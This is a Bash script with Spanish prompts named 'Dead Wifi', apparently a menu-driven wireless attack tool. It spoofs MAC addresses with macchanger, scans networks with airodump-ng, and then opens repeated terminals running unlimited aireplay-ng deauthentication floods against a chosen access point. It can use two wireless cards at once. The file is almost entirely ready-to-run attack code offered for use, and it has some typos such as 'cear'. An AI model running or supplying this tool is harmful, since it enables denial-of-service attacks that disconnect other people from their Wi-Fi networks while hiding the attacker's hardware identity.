#! /bin/bash

#Colors
red='\e[1;31m'
blue='\e[1;34m'
yellow='\e[1;33m'
white="\e[1;37m"
grey="\e[0;37m"
purple="\e[0;35m"
green="\e[1;32m"
Purple="\e[0;35m"
Cyan="\e[0;36m"
Cafe="\e[0;33m"
Fiuscha="\e[0;35m"
transparent="\e[0m"

figlet Dead Wifi

echo -e "${red} Smp_A" "${transparent}"
echo ""

tecla=0
while [ $tecla -ne 4 ]
do 
aceptar="Y"
negar="N"
                  echo -e "${green} selecion Wlans" "1ª=$wlanA  2ª=$wlanB" "${transparent}"
echo ""
read -n 1 -p "pulsa una opción: 
            
              1) Cambiar Mac
            
              2) Scaner red 
            
              3) Dead wifi
             
              4) Exit 
                
                selec   " tecla

case $tecla in 


1)

clear
ifconfig
read -p "Seleccione tarjeta de red:" wlanA

export $wlanA
ifconfig $wlanA down 
macchanger -A $wlanA 
ifconfig  $wlanA up 


read -p "Desea selecionar otra Wlan más para el ataque Si=Y No=N:" evalua

if [ "$aceptar" = "$evalua" ]
then
echo ""
read -p "Seleccione tarjeta de red 2º:" wlanB
export $wlanB
ifconfig $wlanB down 
macchanger -A $wlanB 
ifconfig  $wlanB up 
echo -e "${red} Ataque Harcore Rock"
Rock="1"

else
echo -e "${blue} No secciono una 2º tarjeta ataque"
Rock="0"
sleep 1
cear 
figlet Dead Wifi
fi;;


2)x-terminal-emulator -e "bash -c \" airodump-ng $wlanA;exec bash\"" ;;

3) 
IFS=","
echo ""
read -p "Seleccione MAC,canal y Número de ataques separe con , :" MAC canal numero
x-terminal-emulator -e "bash -c \" airodump-ng -c $canal $wlanA;exec bash\""
sleep 1

for(( a=1; a <= $numero; a++))
do
x-terminal-emulator -e "bash -c \"aireplay-ng -0 0 -a $MAC $wlanA; exec bash\""
if  [ "$Rock" = "1" ]
then
x-terminal-emulator -e "bash -c \"aireplay-ng -0 0 -a $MAC $wlanB; exec bash\""
fi
done;;

esac
done
cear 
figlet Dead Wifi
echo ""
echo -e  "${red}Siempre A"
